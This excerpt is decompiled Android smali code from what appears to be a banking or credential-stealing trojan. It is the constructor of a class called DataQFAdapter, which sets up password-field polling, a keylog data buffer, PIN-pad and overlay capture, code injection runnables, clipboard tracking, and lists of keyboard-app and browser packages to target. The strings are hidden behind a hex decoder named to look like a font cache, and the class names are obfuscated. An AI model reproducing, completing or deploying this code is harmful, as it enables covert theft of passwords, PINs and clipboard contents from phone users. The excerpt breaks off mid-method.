    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 96
    .line 97
    .line 98
    move-result-object v3

    .line 99
    invoke-direct {v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 100
    .line 101
    .line 102
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollHandler:Landroid/os/Handler;

    .line 103
    .line 104
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollFieldKey:Ljava/lang/String;

    nop

    nop

    .line 105
    .line 106
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollAppPkg:Ljava/lang/String;

    .line 107
    .line 108
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollAppName:Ljava/lang/String;

    .line 109
    .line 110
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollHint:Ljava/lang/String;

    .line 111
    .line 112
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollViewId:Ljava/lang/String;

    .line 113
    .line 114
    const-string v2, "password"

    .line 115
    .line 116
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollFieldType:Ljava/lang/String;

    .line 117
    .line 118
    const-wide/16 v2, 0x64

    nop

    nop

    .line 119
    .line 120
    iput-wide v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->PWD_POLL_INTERVAL_MS:J

    .line 121
    .line 122
    const-wide/16 v2, 0x7530

    .line 123
    .line 124
    iput-wide v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->PWD_POLL_TIMEOUT_MS:J

    .line 125
    .line 126
    new-instance v2, Lv/s/Zj7xUGIRtnJNFsajky;

    .line 127
    .line 128
    const/16 v3, 0x1

    .line 129
    invoke-direct {v2, v0, v3}, Lv/s/Zj7xUGIRtnJNFsajky;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 130
    .line 131
    .line 132
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollRunnable:Ljava/lang/Runnable;

    nop

    .line 133
    .line 134
    new-instance v2, Ljava/util/HashMap;

    .line 135
    .line 136
    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    .line 137
    .line 138
    .line 139
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingKeylogData:Ljava/util/HashMap;

    .line 140
    .line 141
    new-instance v2, Ljava/util/HashMap;

    .line 142
    .line 143
    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    .line 144
    .line 145
    .line 146
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinPadBoundsMap:Ljava/util/HashMap;

    .line 147
    .line 148
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinPadMapPkg:Ljava/lang/String;

    .line 149
    .line 150
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayPkg:Ljava/lang/String;

    .line 151
    .line 152
    new-instance v2, Ljava/util/HashMap;

    .line 153
    .line 154
    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    .line 155
    .line 156
    .line 157
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayBuffer:Ljava/util/HashMap;

    .line 158
    .line 159
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinFlushPkg:Ljava/lang/String;

    .line 160
    .line 161
    new-instance v2, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 162
    .line 163
    const/16 v3, 0xa

    nop

    .line 164
    .line 165
    invoke-direct {v2, v0, v3}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 166
    .line 167
    .line 168
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayRemoveRunnable:Ljava/lang/Runnable;

    .line 169
    .line 170
    const-string v2, "003300770048009400F300B000D600A2"

    .line 171
    .line 172
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 173
    .line 174
    .line 175
    move-result-object v3

    .line 176
    const-string v2, "00260078004F008200E200FF00C200A6003000650058008800F400BA"

    .line 177
    .line 178
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 179
    .line 180
    .line 181
    move-result-object v4

    .line 182
    const-string v2, "002000790055008100F900AD00DF00E7003300770048009400F300B000D600A2"

    .line 183
    .line 184
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 185
    .line 186
    .line 187
    move-result-object v5

    .line 188
    const-string v2, "00260078004F008200E200FF00C200AE002D"

    .line 189
    .line 190
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 191
    .line 192
    .line 193
    move-result-object v6

    nop

    .line 194
    const-string v2, "00260078004F008200E200FF00CB00A800360064001B009700F900B1"

    nop

    .line 195
    .line 196
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 197
    .line 198
    .line 199
    move-result-object v7

    .line 200
    const-string v2, "002000790055008100F900AD00DF00E70033007F0055"

    .line 201
    .line 202
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 203
    .line 204
    .line 205
    move-result-object v8

    .line 206
    const-string v2, "00200064005E008600E400BA009200B7002A0078"

    .line 207
    .line 208
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 209
    .line 210
    .line 211
    move-result-object v9

    .line 212
    const-string v2, "003500730049008E00F600A6009200B7002A0078"

    .line 213
    .line 214
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 215
    .line 216
    .line 217
    move-result-object v10

    .line 218
    const-string v2, "00300073004F00C700E000B600DC"

    .line 219
    .line 220
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 221
    .line 222
    .line 223
    move-result-object v11

    nop

    .line 224
    const-string v2, "04710424040E04D304A8049D048700E7047C0426047B04D904AB0493"

    .line 225
    .line 226
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 227
    .line 228
    .line 229
    move-result-object v12

    .line 230
    const-string v2, "04710424040E04D304A8049D048700E704790428040F"

    nop

    .line 231
    .line 232
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 233
    .line 234
    .line 235
    move-result-object v13

    .line 236
    const-string v2, "04710424040E04D304A8049D048700E7047C042E0406"

    .line 237
    .line 238
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 239
    .line 240
    .line 241
    move-result-object v14

    .line 242
    const-string v2, "047C0428040F04A504A204EA04F204F3047B0454040E00C704AF04E7048F"

    .line 243
    .line 244
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 245
    .line 246
    .line 247
    move-result-object v15

    nop

    .line 248
    const-string v2, "047C042E040600CA04AA04E10486"

    nop

    nop

    .line 249
    .line 250
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 251
    .line 252
    .line 253
    move-result-object v16

    .line 254
    const-string v2, "00260078004F008200E200FF00C200A600300065004C008800E200BB"

    .line 255
    .line 256
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 257
    .line 258
    .line 259
    move-result-object v17

    .line 260
    const-string v2, "003600780057008800F300B4"

    .line 261
    .line 262
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 263
    .line 264
    .line 265
    move-result-object v18

    .line 266
    const-string v2, "04030426040C04D604AB04E1048804FF04030428040904D704D20493"

    .line 267
    .line 268
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 269
    .line 270
    .line 271
    move-result-object v19

    .line 272
    const-string v2, "0021007F0054008A00F500AB00C000AE0020"

    nop

    .line 273
    .line 274
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 275
    .line 276
    .line 277
    move-result-object v20

    .line 278
    const-string v2, "0025007F0055008000F500AD00C200B5002A0078004F"

    .line 279
    .line 280
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 281
    .line 282
    .line 283
    move-result-object v21

    .line 284
    const-string v2, "002500770058008200B000B600D6"

    .line 285
    .line 286
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 287
    .line 288
    .line 289
    move-result-object v22

    .line 290
    const-string v2, "04710424040E04D304A8049D048700E704790428040F00CA04AF04EF04F204F90478045A"

    .line 291
    .line 292
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 293
    .line 294
    .line 295
    move-result-object v23

    .line 296
    const-string v2, "003000730058009200E200B600C600BE006300750054008300F5"

    .line 297
    .line 298
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 299
    .line 300
    .line 301
    move-result-object v24

    .line 302
    const-string v2, "04790428040F00C704A104EA048504F9047C0426047A04DA04AE049E04F004FF"

    .line 303
    .line 304
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 305
    .line 306
    .line 307
    move-result-object v25

    .line 308
    const-string v2, "003300770048009400E700B000C000B3006300730052008900F700BA00D000A2002D"

    nop

    nop

    .line 309
    .line 310
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 311
    .line 312
    .line 313
    move-result-object v26

    .line 314
    const-string v2, "00200079005F008200B000BA00DB00A9002400730059008200FE"

    .line 315
    .line 316
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 317
    .line 318
    .line 319
    move-result-object v27

    .line 320
    const-string v2, "00260078004F009500F500A5009200AB002600360058008800F400BA"

    .line 321
    .line 322
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 323
    .line 324
    .line 325
    move-result-object v28

    .line 326
    const-string v2, "003000770052009400F900AC00C100A2003900360057008200B000BC00DD00A30026"

    .line 327
    .line 328
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 329
    .line 330
    .line 331
    move-result-object v29

    .line 332
    filled-new-array/range {v3 .. v29}, [Ljava/lang/String;

    .line 333
    .line 334
    .line 335
    move-result-object v2

    .line 336
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinScreenKeywords:[Ljava/lang/String;

    .line 337
    .line 338
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingInjectPkg:Ljava/lang/String;

    .line 339
    .line 340
    new-instance v2, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 341
    .line 342
    const/16 v3, 0xb

    .line 343
    .line 344
    invoke-direct {v2, v0, v3}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 345
    .line 346
    .line 347
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->injectRunnable:Ljava/lang/Runnable;

    nop

    nop

    .line 348
    .line 349
    new-instance v2, Lv/s/Anxqm3NelDGirLH5;

    .line 350
    .line 351
    invoke-direct {v2, v0}, Lv/s/Anxqm3NelDGirLH5;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 352
    .line 353
    .line 354
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->injectPollRunnable:Lv/s/Anxqm3NelDGirLH5;

    nop

    .line 355
    .line 356
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->lastClipboard:Ljava/lang/String;

    nop

    .line 357
    .line 358
    const-string v2, "00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008E00FE00AF00C700B3002E0073004F008F00FF00BB009C00AB0022006200520089"

    .line 359
    .line 360
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 361
    .line 362
    .line 363
    move-result-object v3

    .line 364
    const-string v2, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900F800B000DC00A2003A00740054008600E200BB"

    .line 365
    .line 366
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 367
    .line 368
    .line 369
    move-result-object v4

    .line 370
    const-string v2, "00200079005600C900E300A800DB00A10037007D005E009E00BE00B300D300A900240063005A008000F500AF00C000A80035007F005F008200E2"

    .line 371
    .line 372
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 373
    .line 374
    .line 375
    move-result-object v5

    .line 376
    const-string v2, "00200079005600C900E400B000C700A4002B00620042009700F500F100C100B0002A0070004F008C00F500A6"

    .line 377
    .line 378
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 379
    .line 380
    .line 381
    move-result-object v6

    .line 382
    const-string v2, "00200079005600C900E900BE00DC00A30026006E0015008C00F500A600D000A800220064005F"

    .line 383
    .line 384
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 385
    .line 386
    .line 387
    move-result-object v7

    .line 388
    const-string v2, "002C0064005C00C900F600AA00C600A8006D007F0055009700E500AB00DF00A20037007E0054008300BE00B300D300B3002A0078"

    .line 389
    .line 390
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 391
    .line 392
    .line 393
    move-result-object v8

    .line 394
    const-string v2, "00200079005600C900F800AA00D300B00026007F0015008E00FE00AF00C700B3002E0073004F008F00FF00BB009C00A4002B0078"

    .line 395
    .line 396
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 397
    .line 398
    .line 399
    move-result-object v9

    .line 400
    const-string v2, "00200079005600C900F800AA00D300B00026007F0015008800F800B000C100E9002A0078004B009200E400B200D700B3002B0079005F"

    .line 401
    .line 402
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 403
    .line 404
    .line 405
    move-result-object v10

    .line 406
    const-string v2, "00200079005600C900FD00B600C700AE006D007F0055009700E500AB00DF00A20037007E00540083"

    .line 407
    .line 408
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 409
    .line 410
    .line 411
    move-result-object v11

    .line 412
    const-string v2, "00200079005600C900F200BE00DB00A3003600380052008900E000AA00C6"

    .line 413
    .line 414
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 415
    .line 416
    .line 417
    move-result-object v12

    .line 418
    const-string v2, "00200079005600C900F200BE00DB00A3003600380052008900E000AA00C60098002B0063005A009000F500B6"

    .line 419
    .line 420
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 421
    .line 422
    .line 423
    move-result-object v13

    .line 424
    const-string v2, "00200079005600C900E300B000D500A8003600380052008900E000AA00C600AA002600620053008800F400F100C100A800240079004E"

    .line 425
    .line 426
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 427
    .line 428
    .line 429
    move-result-object v14

    .line 430
    const-string v2, "00200079005600C900F900B900DE00BE00370073005000C900F900B100C200B20037007B005E009300F800B000D6"

    .line 431
    .line 432
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 433
    .line 434
    .line 435
    move-result-object v15

    .line 436
    const-string v2, "00200079005600C900F300B000DD00B30026007D0015009400FD00BE00C000B3002A0078004B009200E400A90087"

    .line 437
    .line 438
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 439
    .line 440
    .line 441
    move-result-object v16

    .line 442
    const-string v2, "00200079005600C900E300BA00D100E900220078005F009500FF00B600D600E9002A0078004B009200E400B200D700B3002B0079005F"

    .line 443
    .line 444
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 445
    .line 446
    .line 447
    move-result-object v17

    .line 448
    const-string v2, "00200079005600C900FC00B800D700E9002A007B005E"

    .line 449
    .line 450
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 451
    .line 452
    .line 453
    move-result-object v18

    .line 454
    const-string v2, "00200079005600C900FE00AA00D300A9002000730015009400E700A600C200A2006D0072004F0084"

    .line 455
    .line 456
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 457
    .line 458
    .line 459
    move-result-object v19

    .line 460
    const-string v2, "00200079005600C900F100B100CB00B4002C0070004F008C00F500A600D000A800220064005F00C900FC00BE00DC00A000360077005C008200E000BE00D100AC"

    .line 461
    .line 462
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 463
    .line 464
    .line 465
    move-result-object v20

    .line 466
    const-string v2, "00200079005600C900FD00BA00DC00A9003A0038005A008900F400AD00DD00AE00270038005A008900E900AC00DD00A10037007D005E009E00F200B000D300B50027"

    .line 467
    .line 468
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 469
    .line 470
    .line 471
    move-result-object v21

    nop

    .line 472
    const-string v2, "00200079005600C900FD00B600D100B5002C00650054008100E400F100C100B0002A0070004F008C00F500A6"

    .line 473
    .line 474
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 475
    .line 476
    .line 477
    move-result-object v22

    .line 478
    const-string v2, "00200079005600C900F600B300D700AC0030006F0015008C00F500A600D000A800220064005F"

    .line 479
    .line 480
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 481
    .line 482
    .line 483
    move-result-object v23

    .line 484
    const-string v2, "00200079005600C900F700AD00D300AA002E00770049008B00E900F100D300A9002700640054008E00F400F100D900A2003A00740054008600E200BB"

    .line 485
    .line 486
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 487
    .line 488
    .line 489
    move-result-object v24

    .line 490
    const-string v2, "002C0064005C00C900E000B000D100AC00260062004C008800E200B400C100B3002200620052008800FE00F100C200A4002800730042008500FF00BE00C000A3"

    .line 491
    .line 492
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 493
    .line 494
    .line 495
    move-result-object v25

    .line 496
    const-string v2, "00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008600E000AF00C100E9002A0078004B009200E400B200D700B3002B0079005F00C900F800B600DC00A3002A"

    nop

    .line 497
    .line 498
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 499
    .line 500
    .line 501
    move-result-object v26

    .line 502
    const-string v2, "00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008600E000AF00C100E9002A0078004B009200E400B200D700B3002B0079005F00C900EA00B700C700BE002A0078"

    .line 503
    .line 504
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 505
    .line 506
    .line 507
    move-result-object v27

    .line 508
    filled-new-array/range {v3 .. v27}, [Ljava/lang/String;

    .line 509
    .line 510
    .line 511
    move-result-object v2

    .line 512
    invoke-static {v2}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 513
    .line 514
    .line 515
    move-result-object v2

    .line 516
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->imePackages:Ljava/util/Set;

    .line 517
    .line 518
    const-string v2, "00200079005600C900F100B100D600B5002C007F005F00C900F300B700C000A8002E0073"

    .line 519
    .line 520
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 521
    .line 522
    .line 523
    move-result-object v3

    .line 524
    const-string v2, "00200079005600C900F300B700C000A8002E00730015008500F500AB00D3"

    .line 525
    .line 526
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 527
    .line 528
    .line 529
    move-result-object v4

    .line 530
    const-string v2, "00200079005600C900F300B700C000A8002E00730015008300F500A9"

    .line 531
    .line 532
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 533
    .line 534
    .line 535
    move-result-object v5

    .line 536
    const-string v2, "00200079005600C900F300B700C000A8002E00730015008400F100B100D300B5003A"

    .line 537
    .line 538
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 539
    .line 540
    .line 541
    move-result-object v6

    .line 542
    const-string v2, "00200079005600C900F200AD00D300B1002600380059009500FF00A800C100A20031"

    .line 543
    .line 544
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 545
    .line 546
    .line 547
    move-result-object v7

    .line 548
    const-string v2, "00200079005600C900F200AD00D300B1002600380059009500FF00A800C100A2003100380059008200E400BE"

    .line 549
    .line 550
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 551
    .line 552
    .line 553
    move-result-object v8

    .line 554
    const-string v2, "00200079005600C900F200AD00D300B1002600380059009500FF00A800C100A2003100380055008E00F700B700C600AB003A"

    .line 555
    .line 556
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 557
    .line 558
    .line 559
    move-result-object v9

    .line 560
    const-string v2, "00200079005600C900E600B600C400A6002F0072005200C900F200AD00DD00B0003000730049"

    .line 561
    .line 562
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 563
    .line 564
    .line 565
    move-result-object v10

    .line 566
    const-string v2, "00200079005600C900E600B600C400A6002F0072005200C900F200AD00DD00B000300073004900C900E300B100D300B70030007E00540093"

    .line 567
    .line 568
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 569
    .line 570
    .line 571
    move-result-object v11

    .line 572
    const-string v2, "00200079005600C900FF00AF00D700B5002200380059009500FF00A800C100A20031"

    .line 573
    .line 574
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 575
    .line 576
    .line 577
    move-result-object v12

    .line 578
    const-string v2, "00200079005600C900FF00AF00D700B5002200380059009500FF00A800C100A2003100380059008200E400BE"

    .line 579
    .line 580
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 581
    .line 582
    .line 583
    move-result-object v13

    .line 584
    const-string v2, "00200079005600C900FF00AF00D700B5002200380056008E00FE00B6009C00A9002200620052009100F5"

    .line 585
    .line 586
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 587
    .line 588
    .line 589
    move-result-object v14

    .line 590
    const-string v2, "00200079005600C900FD00B600D100B5002C00650054008100E400F100D700AA002E006E"

    .line 591
    .line 592
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 593
    .line 594
    .line 595
    move-result-object v15

    .line 596
    const-string v2, "00200079005600C900E300BA00D100E900220078005F009500FF00B600D600E900220066004B00C900E300BD00C000A800340065005E0095"

    .line 597
    .line 598
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 599
    .line 600
    .line 601
    move-result-object v16

    .line 602
    const-string v2, "002C0064005C00C900F300B700C000A8002E007F004E008A00BE00BC00DA00B5002C007B005E"

    nop

    nop

    .line 603
    .line 604
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 605
    .line 606
    .line 607
    move-result-object v17

    .line 608
    const-string v2, "00200079005600C900FB00B600C500AE002100640054009000E300BA00C000E9002100640054009000E300BA00C0"

    .line 609
    .line 610
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 611
    .line 612
    .line 613
    move-result-object v18

    .line 614
    const-string v2, "002C0064005C00C900F200AD00DD00AA002A0062005E00C900F200AD00DD00AA002A0062005E"

    .line 615
    .line 616
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 617
    .line 618
    .line 619
    move-result-object v19

    .line 620
    const-string v2, "00200079005600C900F100AC00C200A2002000620015008500E200B000C500B400260064"

    .line 621
    .line 622
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 623
    .line 624
    .line 625
    move-result-object v20

    .line 626
    filled-new-array/range {v3 .. v20}, [Ljava/lang/String;

    .line 627
    .line 628
    .line 629
    move-result-object v2

    .line 630
    invoke-static {v2}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 631
    .line 632
    .line 633
    move-result-object v2

    .line 634
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->chromeLikeBrowsers:Ljava/util/Set;

    .line 635
    .line 636
    const-string v2, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900FD00BA00C100B4002200710052008900F7"

    .line 637
    .line 638
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 639
    .line 640
    .line 641
    move-result-object v3

    .line 642
    const-string v2, "00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008600E000AF00C100E9002E00730048009400F100B800DB00A90024"

    .line 643
    .line 644
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 645
    .line 646
    .line 647
    move-result-object v4

    .line 648
    const-string v2, "00200079005600C900F100B100D600B5002C007F005F00C900FD00B200C1"

    .line 649
    .line 650
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 651
    .line 652
    .line 653
    move-result-object v5

    .line 654
    const-string v2, "00200079005600C900F100B100D600B5002C007F005F00C900FD00BA00C100B4002200710052008900F7"

    .line 655
    .line 656
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 657
    .line 658
    .line 659
    move-result-object v6

    .line 660
    const-string v2, "00200079005600C900E800B600D300A8002E007F0015008A00FD00AC"

    .line 661
    .line 662
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 663
    .line 664
    .line 665
    move-result-object v7

    .line 666
    const-string v2, "00200079005600C900F800AA00D300B00026007F0015008A00F500AC00C100A600240073"

    .line 667
    .line 668
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 669
    .line 670
    .line 671
    move-result-object v8

    .line 672
